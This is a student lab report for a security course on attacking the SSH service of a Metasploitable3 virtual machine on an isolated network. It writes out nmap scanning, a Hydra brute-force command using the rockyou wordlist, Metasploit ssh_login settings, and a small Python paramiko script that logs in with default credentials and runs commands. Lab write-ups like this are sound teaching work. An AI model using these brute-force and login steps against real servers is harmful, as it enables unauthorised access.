# ICS344 Project – Phase 1 Report

**Title:** SSH Service Exploitation on Metasploitable3  
**Student:** Sultan Alatawi  
**Date:** April 27, 2025

---

## Objective
The goal of Phase 1 is to exploit a vulnerable SSH service running on a Metasploitable3 virtual machine (victim) using a Kali Linux machine (attacker).  
This phase demonstrates successful brute-force attacks using Hydra, manual exploitation via Metasploit Framework, and automation through a custom Python script (Proof of Concept).

---

## Environment Setup
- **Attacker Machine:** Kali Linux  
  - IP Address: `192.168.8.164/24`
- **Victim Machine:** Metasploitable3 Ubuntu 14.04  
  - IP Address: `192.168.8.165/24`
- **Network Setup:** Both machines are configured on the same private subnet (`192.168.8.x`) to allow direct communication.

Both VMs were connected through a host-only/private network ensuring no external internet access during testing.

---

## Task 1.1: Manual Exploitation Using Metasploit

### Step-by-Step Actions:

1. **Network Connectivity Test:**

   Verified communication between attacker and victim:

   ```bash
   ping 192.168.8.165
Successful replies confirmed network connectivity.

Scanning the Victim with Nmap:

Discovered open ports and running services:

bash
Copy
Edit
nmap -sV 192.168.8.165
Key findings:

Port 22/tcp (SSH) - OpenSSH 6.6.1p1

Port 21/tcp (FTP) - ProFTPD 1.3.5

Port 80/tcp (HTTP) - Apache httpd 2.4.7

Brute-Forcing SSH with Hydra:

Attempted to brute-force SSH login credentials:

bash
Copy
Edit
hydra -l vagrant -P /usr/share/wordlists/rockyou.txt ssh://192.168.8.165
Result:

Username: vagrant

Password: vagrant

Launching Metasploit Framework:

Started Metasploit:

bash
Copy
Edit
sudo msfconsole
Exploiting SSH Using Metasploit:

Loaded the SSH login module:

bash
Copy
Edit
use auxiliary/scanner/ssh/ssh_login
Set necessary options:

bash
Copy
Edit
set RHOSTS 192.168.8.165
set USERNAME vagrant
set PASSWORD vagrant
set STOP_ON_SUCCESS true
run
Opening the SSH Session:

After successful login:

bash
Copy
Edit
sessions
sessions -i 1
Verifying Shell Access:

Executed simple commands inside the victim machine:

bash
Copy
Edit
whoami
uname -a
Output:

Current user: vagrant

Operating System: Ubuntu 14.04 LTS

Proofs:
*(Insert screenshots here:

Nmap output

Hydra successful login

Metasploit session opening

whoami output inside victim)*

Task 1.2: Automated Exploitation Using a Custom Python Script
Step-by-Step Actions:
Installing Python SSH Library:

Installed paramiko for SSH communication:

bash
Copy
Edit
sudo apt update
sudo apt install python3-pip
pip3 install paramiko
Developing the Custom Script:

Created a script ssh_exploit.py to automate the login process:

python
Copy
Edit
import paramiko

target_ip = "192.168.8.165"
port = 22
username = "vagrant"
password = "vagrant"

def ssh_connect(ip, port, user, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=port, username=user, password=passwd)
        print(f"[+] Connected successfully to {ip} via SSH!")
        stdin, stdout, stderr = client.exec_command("whoami")
        print("[+] Command output:")
        print(stdout.read().decode())
        client.close()
    except Exception as e:
        print(f"[-] Connection failed: {e}")

if __name__ == "__main__":
    ssh_connect(target_ip, port, username, password)
Running the Script:

Executed the exploit:

bash
Copy
Edit
python3 ssh_exploit.py
Verifying Access:

Output confirmed successful login as vagrant and execution of commands on the victim machine.

Proofs:
*(Insert screenshots here:

Running ssh_exploit.py script

Successful SSH connection output

whoami command execution)*
